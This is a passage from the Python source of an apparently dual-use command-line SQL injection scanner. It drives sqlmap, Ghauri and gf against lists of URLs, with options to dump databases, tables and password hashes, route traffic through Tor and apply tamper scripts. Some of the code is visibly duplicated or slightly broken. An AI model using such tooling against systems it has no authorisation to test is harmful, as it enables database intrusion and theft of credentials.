                    f"📊 [RESUME] Processed: {len(resume_state.get('processed_urls', []))}"
                )
                print(
                    f"📊 [RESUME] Remaining: {len(resume_state.get('remaining_urls', []))}"
                )
        else:
            print("📋 [RESUME] No previous scan state found, starting new scan")
            resume = False

    # Validate URL
    if not url and not urls_file:
        print("❌ [ERROR] Either --url or --urls-file must be provided")
        return

    # Create output directory
    Path(output_dir).mkdir(parents=True, exist_ok=True)

    # Prepare URLs list
    urls = []
    completed_results = []

    if resume and resume_state:
        # Resume from previous state
        urls = resume_state.get("remaining_urls", [])
        completed_results = resume_state.get("completed_results", [])
        if verbose:
            print(
                f"⏸️ [RESUME] Resuming from previous state: {resume_state.get('scan_id')}"
            )
            print(f"📊 [RESUME] Processed: {resume_state.get('processed_urls', [])}")
            print(f"📊 [RESUME] Remaining: {len(urls)}")
    elif urls_file:
        if verbose:
            print(f"📂 [LOAD] Loading URLs from {urls_file}")
        with open(urls_file, "r") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    urls.append(line)
        if verbose:
            print(f"📝 [LOAD] Loaded {len(urls)} URLs from file")
    elif url:
        urls = [url]
    else:
        print("❌ [ERROR] Either --url, --urls-file, or --resume must be provided")
        return

    if verbose:
        print(f"📊 [TOTAL] Testing {len(urls)} URLs")

    # Check tool availability
    available_tools = check_tool_availability()
    if verbose:
        print("🔧 [TOOLS] Available tools:")
        for tool_name, info in available_tools.items():
            status = "✅" if info["available"] else "❌"
            print(f"  {status} {tool_name}")

    # Determine which tools to use
    use_sqlmap = sqlmap or tool in ["sqlmap", "all"]
    use_ghauri = ghauri or tool in ["ghauri", "all"]
    use_gf = gf or tool in ["gf", "all"]
    use_basic = basic_test or tool in ["basic", "all"]

    # Prepare options
    # Load custom payloads if provided
    custom_payloads = load_custom_payloads(payloads) if payloads else None
    if custom_payloads and verbose:
        print(
            f"📝 [PAYLOADS] Loaded {len(custom_payloads)} custom payloads from {payloads}"
        )

    options = {
        "output_dir": output_dir,
        "level": level,
        "risk": risk,
        "technique": technique,
        "dbms": dbms,
        "cookie": cookie,
        "data": data,
        "proxy": proxy,
        "user_agent": user_agent,
        "random_agent": random_agent,
        "headers": list(headers) if headers else None,
        "tamper": tamper,
        "threads": threads,
        "batch": batch,
        "tor": tor,
        "check_tor": check_tor,
        "dbs": dbs,
        "tables": tables,
        "columns": columns,
        "dump": dump,
        "dump_all": dump_all,
        "passwords": passwords,
        "privileges": privileges,
        "current_user": current_user,
        "current_db": current_db,
        "hostname": hostname,
        "schema": schema,
        "search": search,
        "sqlmap_args": sqlmap_args,
        "ghauri_args": ghauri_args,
        "ai": ai,
        "store_db": store_db,
        "dry_run": dry_run,
        "retry": retry,
        "concurrency": concurrency,
        "custom_payloads": custom_payloads,
    }

    # Process each URL
    all_results = completed_results.copy() if completed_results else []

    # Initialize database if store_db is enabled
    scan_session_id = None
    if store_db:
        init_database(output_dir)
        scan_session_id = store_scan_session(output_dir, urls, options)
        if verbose:
            print(
                f"🗄️ [DATABASE] Initialized database and created scan session {scan_session_id}"
            )

    # Create state file for new scan if not resuming
    if not resume:
        state_file = create_resume_state(output_dir, urls, options)
        if verbose:
            print("💾 [RESUME] State file created for resume functionality")

    # Process URLs with concurrent support
    if concurrency > 1:
        if verbose:
            print(
                f"🚀 [CONCURRENT] Processing {len(urls)} URLs with {concurrency} workers"
            )

        # Prepare tools configuration
        tools_config = {
            "use_basic": use_basic,
            "use_sqlmap": use_sqlmap and available_tools["sqlmap"]["available"],
            "use_ghauri": use_ghauri and available_tools["ghauri"]["available"],
            "use_gf": use_gf and available_tools.get("gf", {}).get("available"),
            "timeout": timeout,
            "verbose": verbose,
        }

        # Process all URLs concurrently
        new_results = []
        for url in urls:
            # ========== Cache Check ==========
            if cache_manager:
                cache_options = {
                    "tool": tool,
                    "sqlmap": use_sqlmap,
                    "ghauri": use_ghauri,
                    "gf": use_gf,
                    "basic_test": use_basic,
                    "level": level,
                    "risk": risk,
                    "technique": technique,
                    "dbms": dbms,
                    "tamper": tamper,
                    "proxy": proxy,
                    "timeout": timeout,
                    "custom_payloads": bool(custom_payloads),
                    "ai_enabled": ai,
                }

                cached_result = cache_manager.get_cached_result(
                    url, tool, cache_options
                )
                if cached_result:
                    if verbose:
                        print(f"💾 [CACHE] Using cached result for {url}")
                    new_results.append(cached_result["result"])
                    all_results.append(cached_result["result"])
                    continue
                elif verbose:
                    print(f"💾 [CACHE] No cache found for {url}, scanning...")

            result = process_target_with_concurrency(
                url,
                options,
                tools_config,
                custom_payloads=custom_payloads,
                ai_enabled=ai,
                db_path=output_dir if store_db else None,
                session_id=scan_session_id,
                dry_run=dry_run,
                retry_count=retry,
            )
            if result:
                # ========== Cache Storage ==========
                if cache_manager and not dry_run:
                    cache_manager.store_result(url, tool, cache_options, result)
                    if verbose:
                        print(f"💾 [CACHE] Stored result for {url} in cache")

                new_results.append(result)
                all_results.append(result)
    else:
        # Sequential processing (original logic)
        for i, target_url in enumerate(urls):
            if verbose:
                print(f"🔍 [SCAN] Processing URL {i + 1}/{len(urls)}: {target_url}")

            # ========== Cache Check ==========
            if cache_manager:
                cache_options = {
                    "tool": tool,
                    "sqlmap": use_sqlmap,
                    "ghauri": use_ghauri,
                    "gf": use_gf,
                    "basic_test": use_basic,
                    "level": level,
                    "risk": risk,
                    "technique": technique,
                    "dbms": dbms,
                    "tamper": tamper,
                    "proxy": proxy,
                    "timeout": timeout,
                    "custom_payloads": bool(custom_payloads),
                    "ai_enabled": ai,
                }

                cached_result = cache_manager.get_cached_result(
                    target_url, tool, cache_options
                )
                if cached_result:
                    if verbose:
                        print(f"💾 [CACHE] Using cached result for {target_url}")
                    all_results.append(cached_result["result"])
                    # Update resume state
                    if state_file:
                        update_resume_state(
                            state_file,
                            target_url,
                            cached_result["result"],
                            urls[i + 1 :],
                        )
                    continue
                elif verbose:
                    print(f"💾 [CACHE] No cache found for {target_url}, scanning...")

            result = {
                "target": target_url,
                "timestamp": datetime.now().isoformat(),
                "injection_points": [],
            }

            # Detect injection points
            if verbose:
                print("🔍 [DETECT] Detecting injection points...")
            result["injection_points"] = detect_injection_points(target_url)
            if verbose:
                print(
                    f"🔍 [DETECT] Found {len(result['injection_points'])} potential injection points"
                )

            # Basic SQL injection testing
            if use_basic:
                if verbose:
                    print("🧪 [BASIC] Running basic SQL injection tests...")
                result["basic_sqli_results"] = test_basic_sql_injection(
                    target_url, custom_payloads=custom_payloads
                )
                if verbose:
                    vulnerabilities = [
                        r for r in result["basic_sqli_results"] if r.get("vulnerable")
                    ]
                    print(
                        f"🧪 [BASIC] Found {len(vulnerabilities)} potential vulnerabilities"
                    )

            # SQLMap testing
            if use_sqlmap and available_tools["sqlmap"]["available"]:
                if verbose:
                    print("🔥 [SQLMAP] Running SQLMap...")
                result["sqlmap_results"] = run_sqlmap(target_url, options, timeout)
                if result["sqlmap_results"]["success"]:
                    result["sqlmap_findings"] = parse_sqlmap_output(
                        result["sqlmap_results"]["output_file"]
                    )
                    if verbose:
                        print(
                            f"🔥 [SQLMAP] Found {len(result['sqlmap_findings'])} findings"
                        )
                else:
                    if verbose:
                        print(
                            f"❌ [SQLMAP] Failed: {result['sqlmap_results'].get('error', 'Unknown error')}"
                        )

            # Ghauri testing
            if use_ghauri and available_tools["ghauri"]["available"]:
                if verbose:
                    print("⚡ [GHAURI] Running Ghauri...")
                result["ghauri_results"] = run_ghauri(target_url, options, timeout)
                if result["ghauri_results"]["success"]:
                    result["ghauri_findings"] = parse_ghauri_output(
                        result["ghauri_results"]["output_file"]
                    )
                    if verbose:
                        print(
                            f"⚡ [GHAURI] Found {len(result['ghauri_findings'])} findings"
                        )
                else:
                    if verbose:
                        print(
                            f"❌ [GHAURI] Failed: {result['ghauri_results'].get('error', 'Unknown error')}"
                        )

            # GF pattern matching
            if use_gf and available_tools.get("gf", {}).get("available"):
                if verbose:
                    print("🔍 [GF] Running GF pattern matching...")
                urls_for_gf = [target_url] if not urls_file else urls
                result["gf_results"] = run_gf_sqli_patterns(urls_for_gf, output_dir)
                if verbose:
                    total_matches = sum(
                        r.get("match_count", 0) for r in result["gf_results"].values()
                    )
                    print(f"🔍 [GF] Found {total_matches} pattern matches")

                # Analyze GF results
                result["gf_findings"] = analyze_gf_results(result["gf_results"])
                if verbose:
                    print(
                        f"🔍 [GF] Identified {len(result['gf_findings'])} potential SQL injection points"
                    )

            # AI-powered analysis
            if ai:
                if verbose:
                    print("🧠 [AI] Running AI-powered vulnerability analysis...")
                result["ai_analysis"] = ai_analyze_sqli_results(result, target_url)
                if verbose:
                    ai_summary = result["ai_analysis"]["risk_analysis"]
                    print(f"🧠 [AI] Risk Level: {ai_summary['overall_risk_level']}")
                    print(f"🧠 [AI] Risk Score: {ai_summary['risk_score']}")
                    print(
                        f"🧠 [AI] Critical: {ai_summary['critical_count']}, High: {ai_summary['high_count']}, Medium: {ai_summary['medium_count']}"
                    )

            # Store results to database if enabled
            if store_db and scan_session_id:
                store_target_result(output_dir, scan_session_id, result)
                if result.get("ai_analysis"):
                    store_ai_analysis(
                        output_dir, scan_session_id, target_url, result["ai_analysis"]
                    )

            # ========== Cache Storage ==========
            if cache_manager and not dry_run:
                cache_manager.store_result(target_url, tool, cache_options, result)
                if verbose:
                    print(f"💾 [CACHE] Stored result for {target_url} in cache")

            all_results.append(result)

            # Update resume state
            if state_file:
                update_resume_state(state_file, target_url, result, urls[i + 1 :])

    # Finalize scan session in database
    if store_db and scan_session_id:
        finalize_scan_session(output_dir, scan_session_id)
        if verbose:
            print(f"🗄️ [DATABASE] Finalized scan session {scan_session_id}")

    # Finalize resume state
    if state_file:
        finalize_resume_state(state_file)

    # Generate comprehensive report
    if verbose:
        print("📊 [REPORT] Generating comprehensive report...")

    comprehensive_report = generate_comprehensive_report(all_results, output_dir)

    # Save results
    output_files = []

    if json_report:
        json_file = save_results(comprehensive_report, output_dir, "json")
        output_files.append(json_file)
        if verbose:
            print(f"💾 [SAVE] JSON report saved to {json_file}")

    if yaml_report:
        yaml_file = save_results(comprehensive_report, output_dir, "yaml")
        output_files.append(yaml_file)
        if verbose:
            print(f"💾 [SAVE] YAML report saved to {yaml_file}")

    if markdown_report:
        md_file = save_results(comprehensive_report, output_dir, "markdown")
        output_files.append(md_file)
        if verbose:
            print(f"💾 [SAVE] Markdown report saved to {md_file}")

    # Always save JSON by default
    if not any([json_report, yaml_report, markdown_report]):
        json_file = save_results(comprehensive_report, output_dir, "json")
        output_files.append(json_file)
        if verbose:
            print(f"💾 [SAVE] Default JSON report saved to {json_file}")

    # Print summary
    print("\n" + "=" * 70)
    print("📊 [SUMMARY] SQL Injection Vulnerability Assessment Results")
    print("=" * 70)
    print(f"🎯 Targets tested: {comprehensive_report['summary']['total_targets']}")
    print(
        f"🔴 Vulnerable targets: {comprehensive_report['summary']['vulnerable_targets']}"
    )
    print(
        f"🚨 Critical vulnerabilities: {len(comprehensive_report['summary']['critical_vulnerabilities'])}"
    )
    print(
        f"⚠️ High risk vulnerabilities: {len(comprehensive_report['summary']['high_vulnerabilities'])}"
    )
    print(
        f"📋 Medium risk vulnerabilities: {len(comprehensive_report['summary']['medium_vulnerabilities'])}"
    )
    print(f"🔧 Tools used: {', '.join(comprehensive_report['summary']['tools_used'])}")

    # Display critical vulnerabilities
    if comprehensive_report["summary"]["critical_vulnerabilities"]:
        print("\n🚨 [CRITICAL VULNERABILITIES]")
        for vuln in comprehensive_report["summary"]["critical_vulnerabilities"][:5]:
            print(f"  • {vuln['vulnerability']} at {vuln['target']}")
            print(f"    Detected by: {vuln['tool']}")
            print(f"    {vuln['description']}")

    # Display high risk vulnerabilities
    if comprehensive_report["summary"]["high_vulnerabilities"]:
        print("\n⚠️ [HIGH RISK VULNERABILITIES]")
        for vuln in comprehensive_report["summary"]["high_vulnerabilities"][:5]:
            print(f"  • {vuln['vulnerability']} at {vuln['target']}")
            print(f"    Detected by: {vuln['tool']}")
            print(f"    {vuln['description']}")

    # Display recommendations
    if comprehensive_report["recommendations"]:
        print("\n📋 [RECOMMENDATIONS]")
        for rec in comprehensive_report["recommendations"][:5]:
            print(f"  {rec}")

    # Send notifications
    if slack_webhook or discord_webhook:
        summary_message = "🔍 SQL Injection Vulnerability Scan Complete\n"
        summary_message += (
            f"Targets: {comprehensive_report['summary']['total_targets']}\n"
        )
        summary_message += (
            f"Vulnerable: {comprehensive_report['summary']['vulnerable_targets']}\n"
        )
        summary_message += f"Critical: {len(comprehensive_report['summary']['critical_vulnerabilities'])}\n"
        summary_message += f"High Risk: {len(comprehensive_report['summary']['high_vulnerabilities'])}\n"
        summary_message += (
            f"Tools: {', '.join(comprehensive_report['summary']['tools_used'])}\n"
        )

        if slack_webhook:
            if send_notification(slack_webhook, summary_message, "slack"):
                if verbose:
                    print("✅ [NOTIFY] Slack notification sent")
            else:
                if verbose:
                    print("❌ [NOTIFY] Failed to send Slack notification")

        if discord_webhook:
            if send_notification(discord_webhook, summary_message, "discord"):
                if verbose:
                    print("✅ [NOTIFY] Discord notification sent")
            else:
                if verbose:
                    print("❌ [NOTIFY] Failed to send Discord notification")

    # ========== Cache Statistics ==========
    if cache_manager and verbose:
        stats = cache_manager.get_cache_stats()
        print("\n📊 [CACHE] VulnSQL Cache Performance:")
        print(f"    Cache hits: {stats['cache_hits']}")
        print(f"    Cache misses: {stats['cache_misses']}")
        print(f"    Hit rate: {stats['hit_rate']}")
        print(f"    Cache files: {stats['cache_files']}")
        print(f"    Cache size: {stats['cache_size']} bytes")

    print(f"\n📂 Results saved in: {output_dir}")
    print("🎉 [COMPLETE] VulnSQLiCLI scan finished successfully!")

    # Exit with appropriate code
    if comprehensive_report["summary"]["critical_vulnerabilities"]:
        exit(1)  # Critical vulnerabilities found
    elif comprehensive_report["summary"]["high_vulnerabilities"]:
        exit(2)  # High risk vulnerabilities found
    else:
        exit(0)  # No critical/high vulnerabilities found


def create_resume_state(output_dir, urls, options):
    """Create resume state file for scan continuation."""
    resume_dir = Path(output_dir) / "resume"
    resume_dir.mkdir(parents=True, exist_ok=True)

    state = {
        "scan_id": hashlib.md5(
            str(datetime.now()).encode(), usedforsecurity=False
        ).hexdigest()[:8],
        "created_at": datetime.now().isoformat(),
        "total_urls": len(urls),
        "processed_urls": [],
        "remaining_urls": urls.copy(),
        "completed_results": [],
        "options": options,
        "status": "in_progress",
    }

    state_file = resume_dir / "scan_state.json"
    with open(state_file, "w") as f:
        json.dump(state, f, indent=2)

    return state_file


def load_resume_state(output_dir):
    """Load existing resume state."""
    resume_dir = Path(output_dir) / "resume"
    state_file = resume_dir / "scan_state.json"

    if not state_file.exists():
        return None

    try:
        with open(state_file, "r") as f:
            state = json.load(f)
        return state, state_file
    except Exception as e:
        print(f"❌ [RESUME] Failed to load resume state: {e}")
        return None


def update_resume_state(state_file, processed_url, result, remaining_urls):
    """Update resume state with processed URL and result."""
    try:
        with open(state_file, "r") as f:
            state = json.load(f)

        state["processed_urls"].append(processed_url)
        state["completed_results"].append(result)
        state["remaining_urls"] = remaining_urls
        state["last_updated"] = datetime.now().isoformat()

        with open(state_file, "w") as f:
            json.dump(state, f, indent=2)
    except Exception as e:
        print(f"⚠️ [RESUME] Failed to update state: {e}")


def finalize_resume_state(state_file):
    """Mark scan as completed in resume state."""
    try:
        with open(state_file, "r") as f:
            state = json.load(f)

        state["status"] = "completed"
        state["completed_at"] = datetime.now().isoformat()

        with open(state_file, "w") as f:
            json.dump(state, f, indent=2)
    except Exception as e:
        print(f"⚠️ [RESUME] Failed to finalize state: {e}")


def show_resume_status(output_dir):
    """Show current resume status."""
    resume_state = load_resume_state(output_dir)
    if resume_state:
        state, _ = resume_state
        print("📊 [RESUME-STATUS] Current scan state:")
        print(f"   🆔 Scan ID: {state.get('scan_id', 'Unknown')}")
        print(f"   📅 Created: {state.get('created_at', 'Unknown')}")
        print(f"   📊 Status: {state.get('status', 'Unknown')}")
        print(f"   🎯 Total URLs: {state.get('total_urls', 0)}")
        print(f"   ✅ Processed: {len(state.get('processed_urls', []))}")
        print(f"   ⏳ Remaining: {len(state.get('remaining_urls', []))}")
        print(
            f"   📈 Progress: {len(state.get('processed_urls', [])) / state.get('total_urls', 1) * 100:.1f}%"
        )
    else:
        print("📋 [RESUME-STATUS] No resume state found")


def show_detailed_resume_stats(output_dir):
    """Show detailed resume statistics and progress information."""
    resume_state = load_resume_state(output_dir)
    if not resume_state:
        print("📋 [RESUME-STAT] No resume state found")
        return

    state, _ = resume_state

    print("=" * 70)
    print("📊 [RESUME-STAT] Detailed Resume Statistics")
    print("=" * 70)

    # Basic information
    print(f"🆔 Scan ID: {state.get('scan_id', 'Unknown')}")
    print(f"📅 Created: {state.get('created_at', 'Unknown')}")
    print(f"🔄 Status: {state.get('status', 'Unknown')}")
    print(f"📝 Last Update: {state.get('updated_at', 'Never')}")

    # Progress statistics
    total_urls = state.get("total_urls", 0)
    processed_urls = state.get("processed_urls", [])
    remaining_urls = state.get("remaining_urls", [])
    completed_results = state.get("completed_results", [])

    print("\n📈 Progress Statistics:")
    print(f"   🎯 Total URLs: {total_urls}")
    print(f"   ✅ Processed: {len(processed_urls)}")
    print(f"   ⏳ Remaining: {len(remaining_urls)}")
    print(
        f"   📊 Completion: {len(processed_urls) / total_urls * 100:.1f}%"
        if total_urls > 0
        else "   📊 Completion: 0%"
    )

    # Vulnerability statistics from completed results
    if completed_results:
        print("\n🔍 Vulnerability Statistics:")
        critical_count = 0
        high_count = 0
        medium_count = 0

        for result in completed_results:
            # Count basic SQL injection vulnerabilities
            if result.get("basic_sqli_results"):
                vuln_count = len(
                    [r for r in result["basic_sqli_results"] if r.get("vulnerable")]
                )
                if vuln_count > 0:
                    high_count += vuln_count

            # Count SQLMap findings
            if result.get("sqlmap_findings"):
                findings = result["sqlmap_findings"]
                if any("vulnerability confirmed" in str(f).lower() for f in findings):
                    critical_count += 1

            # Count Ghauri findings
            if result.get("ghauri_findings"):
                findings = result["ghauri_findings"]
                if any("vulnerability confirmed" in str(f).lower() for f in findings):
                    critical_count += 1

        print(f"   🚨 Critical vulnerabilities: {critical_count}")
        print(f"   ⚠️  High vulnerabilities: {high_count}")
        print(f"   📊 Medium vulnerabilities: {medium_count}")

    # Tool usage statistics
    options = state.get("options", {})
    print("\n🔧 Scan Configuration:")
    print(f"   📂 Output directory: {options.get('output_dir', 'default')}")
    print(f"   📊 Level: {options.get('level', 1)}")
    print(f"   ⚠️  Risk: {options.get('risk', 1)}")
    print(f"   🔧 Technique: {options.get('technique', 'auto')}")
    print(f"   🗃️  DBMS: {options.get('dbms', 'auto-detect')}")
    print(f"   🧵 Threads: {options.get('threads', 1)}")

    # Remaining URLs preview
    if remaining_urls:
        print("\n⏳ Next URLs to process (showing first 10):")
        for i, url in enumerate(remaining_urls[:10]):
            print(f"   {i + 1}. {url}")
        if len(remaining_urls) > 10:
            print(f"   ... and {len(remaining_urls) - 10} more")

    # Processing history
    if processed_urls:
        print("\n✅ Recently processed URLs (last 5):")
        for i, url in enumerate(processed_urls[-5:]):
            print(f"   {len(processed_urls) - 4 + i}. {url}")

    print("\n" + "=" * 70)


def reset_all_resume_data(output_dir):
    """Reset and clear all resume data completely."""
    resume_dir = Path(output_dir) / "resume"

    if not resume_dir.exists():
        print("📋 [RESUME-RESET] No resume data found to reset")
        return

    try:
        # Remove all files in resume directory
        for file_path in resume_dir.glob("*"):
            if file_path.is_file():
                file_path.unlink()
                print(f"🗑️  [RESUME-RESET] Removed: {file_path.name}")

        # Remove the resume directory itself
        resume_dir.rmdir()
        print("✅ [RESUME-RESET] All resume data has been completely reset")
        print("🔄 [RESUME-RESET] You can now start a fresh scan")

    except Exception as e:
        print(f"❌ [RESUME-RESET] Error resetting resume data: {e}")
    """Reset and clear all resume data completely."""
    resume_dir = Path(output_dir) / "resume"

    if not resume_dir.exists():
        print("📋 [RESUME-RESET] No resume data found to reset")
        return

    try:
        # Remove all files in resume directory
        for file_path in resume_dir.glob("*"):
            if file_path.is_file():
                file_path.unlink()
                print(f"🗑️  [RESUME-RESET] Removed: {file_path.name}")

        # Remove the resume directory itself
        resume_dir.rmdir()
        print("✅ [RESUME-RESET] All resume data has been completely reset")
        print("🔄 [RESUME-RESET] You can now start a fresh scan")

    except Exception as e:
        print(f"❌ [RESUME-RESET] Error resetting resume data: {e}")


def cleanup_resume_state(output_dir):
    """Clean up resume state files."""
    resume_dir = Path(output_dir) / "resume"
    if resume_dir.exists():
        try:
            state_file = resume_dir / "scan_state.json"
            if state_file.exists():
                state_file.unlink()
                print("✅ [CLEAR-RESUME] Resume state cleared")
            else:
                print("📋 [CLEAR-RESUME] No resume state found")
        except Exception as e:
            print(f"❌ [CLEAR-RESUME] Error clearing resume state: {e}")
    else:
        print("📋 [CLEAR-RESUME] No resume directory found")


if __name__ == "__main__":
    main()
